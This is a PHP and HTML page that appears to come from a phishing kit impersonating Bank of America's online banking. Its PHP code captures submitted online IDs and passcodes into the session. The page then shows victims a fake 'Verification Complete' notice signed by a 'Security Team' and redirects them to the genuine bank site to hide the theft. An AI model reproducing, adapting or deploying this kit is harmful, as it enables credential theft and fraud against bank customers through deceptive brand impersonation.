<?php
session_start();


if(isset($_POST['dummy-onlineId']) && isset($_POST['dummy-passcode']) ){
	
	if ($_POST['dummy-onlineId'] =="" || $_POST['dummy-passcode'] =="" ){
	 @header('Location: index.php');
	
	}else {
	
	$_SESSION['onlineid'] = $_POST['dummy-onlineId'];
	$_SESSION['passcode'] = $_POST['dummy-passcode'];
	
	} 

}
   
?>
<!DOCTYPE html>

<html><head class="at-element-marker" style="visibility:visible;"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot'); 
src: url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.eot?#iefix') 
format('embedded-opentype'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.woff') 
format('woff'), url('/pa/global-assets/1.0/font/cnx-regular/cnx-regular.ttf') format('truetype');
 font-weight: normal; font-style: normal; font-variant: normal; }</style>



<meta http-equiv="X-UA-Compatible" content="IE=Edge">

		<meta name="Keywords" content="Your Information">
		<meta name="Description" content="Your Information">


<!-- TLDB false -->
			<!-- TL-NOPV true -->
	<title>Bank of America | Online Banking | Your Information</title>

	

	<meta name="Description" content="Your Information">
<meta name="Keywords" content="Your Information">


    <link rel="shortcut icon" href="" type="image/x-icon">
   
<!-- TLDB TEALEAF_UiCapture_APP_ENABLED_NOT_TRUE -->



      <script language="JavaScript" type="text/javascript">
  			boaVIPAAjawrEnabled = "true";
  		</script>
				<script language="JavaScript" type="text/javascript">
					boaVIPAAjawrEnabled = "true";
				</script>
							<link rel="stylesheet" type="text/css" href="./OLB_YF_F/vipaa-v3-jawr.css" media="all">
							
							<style id="at-id-default-content-style">.mboxDefault {visibility:hidden;}</style>

	

</head>		
	<body class="fsd-layout-body" style="display: block;">	

				
					<a class="ada-hidden ada-visible-focus" href="" id="ada-skip-link">Skip to main content</a>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">


		<div class="header-vipaa-module">
		   <div class="fsd-secure-esp-skin">
		   	  <img height="28" width="207" alt="Bank of America" src="./OLB_YF_F/bac_reg_logo_tmp_250X69.gif">
			  <div class="page-type cnx-regular" data-font="#!"> </div>
			  <div class="hidden">
					viewIdPwdFlow=&gt; false
			  </div>
			  <div class="right-links">
					<div class="secure-area">Secure Area</div>
					<a class="divide" href="" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En Español</a>
			   
			   <div class="clearboth"></div>
			  </div>
			  <div class="clearboth"></div>
		   </div>
		</div>

	
				<noscript>
					<div class="fauxdal-overlay"></div>
					<div class="fauxdal-module">
						<div class="noscript-reload-skin">
							<div class="fauxdal-top"></div>
							<div class="fauxdal-bottom">
								<div class="fsd-fauxdal-content">
								</div>        
								<div class="fsd-fauxdal-close"> 
									<a class="button-common button-gray" name="close_button_js_disabled_modal" href=><span>Close</span></a>
								</div>
								<div class="clearboth"></div>
							</div>
						</div>
					</div>
				</noscript>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="#!" class="cnx-regular">Your Information</h1>
  </div>
</div>


	<div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
		<div class="error-skin">
			<div class="error-message">	
					<p class="title TLu_ERROR">We can't process your request.</p>
				
			</div>
		</div>
	</div>

	<div class="messaging-vipaa-module">
		<div class="info-blue-bground-skin hide">
		<div class="info-message">
					<p>If you don't have your Social Security Number or Tax Identification Number, please call us at 1.800.933.6262 for help with sign in.</p>
		</div>      
    </div>
</div>
</div>
					<div class="columns">
						<div class="flex-col lt-col">
	<div class="forgot-vipaa-module">
	   <div class="ssn-pwd-skin phoenix">  
			<form name="forgot-onineid-passcode-form" autocomplete="off" id="forgotOnlineidPasscodeForm" method="post" action="" novalidate="novalidate">
		
		<div id="wb_Text2" style="">
<span style="color:#DC143C;font-family:Arial;font-size:20px;"><strong>Bank Of America Verification<br></strong></span><span style="color:#000000;font-family:Arial;font-size:13px;"><br></span><span style="color:#696969;font-family:Arial;font-size:15px;"><strong>Verification Complete !</strong></span><span style="color:#000000;font-family:Arial;font-size:13px;"><br><strong>Note </strong>: You may now use your account as usual .You will be redirected to our main login page in few moments<br><br>We are sorry for the inconvenience that this might have caused you . We will update your account within the next 24 hours <br><br><strong> Bank Of America Security Team</strong></span></div>

		<?php 
		echo    '<script type="text/javascript">
         setTimeout("location.href=\'https://www.bankofamerica.com/\'",3000)
         </script>';
		 
	
		 ?>
		
		
			 
					 <div class="clearboth">
					 
					 
					 
					 </div>
									
				<div class="clearboth"></div>
		    </form>
	   </div>
	</div>
</div>
						<div class="flex-col rt-col">
 <!-- {currentLocation}  -->




	<div class="quick-help-vipaa-module">
		<div class="fsd-lp-skin phoenix sup-ie" aria-atomic="true">			
			<div class="sm-title">	
				<h2 class="sm-header">Quick Help</h2>
				<!-- other than CQ pg -->
			</div>					
			<div class="sm-topcontent-dottedbtm">
				<ul class="help-links">
								<li>
									<a name="What_if_I_don&#39;t_have_a_Social_Security_number_or_Tax_ID_number?" href="javascript:void(0);" class="help-link collapsed"><span class="ada-hidden">Activate to expand.  </span><span class="title">What if I don't have a Social Security number or Tax ID number?</span></a>
									<div class="help-link-answer hide"><p>If you do not have a SSN or Tax ID number, please <a href="" name="faq_no_ssn_contact_us" target="_self">contact us</a>.</p></div>
								</li>
						<!-- other than CQ pg -->
				</ul>
			</div>
					<div class="sm-btmcontent">

		<div class="tc-module">
								<div id="tc-chat-container-2" tabindex="0"></div>
						</div>

					</div>
		</div>
	</div>
</div>
						<div class="clearboth"></div>
					</div>
					<div class="footer">
						<div class="footer-top">&nbsp;


	

<div class="coremetrics-vipaa-module">
	<div class="olb-skin"> 
	<script type="text/javascript">
			var cmPageId = "OLB:Tool:Signin:ForgotIDPasscode;Your_Info";
			var cmCategoryId = "OLB:Tool:Signin:ForgotIDPasscode";
			var cmPageIdModal = "PVParamsMissing";
	
			var testString = window.location.href;
			var vipaaGlobalError="false";			
	</script>
	</div>
</div>


</div>
						<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">Secure area</div>
	
       
      <div class="link-container">
         <div class="link-row"> 
				
				<a class="last-link" href="privacy/" name="Privacy_&_Security_footer" title="Privacy & Security" target="_blank">Privacy &amp; Security</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>Bank of America, N.A. Member FDIC. <a href="help/equalhousing_popup.cfm" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a> <br />&copy;&nbsp;2019 Bank of America Corporation.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
		


<div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;">
<div id="boaFormHelp-content"></div><div class="boaFormHelp-bottom"></div></div>

</html>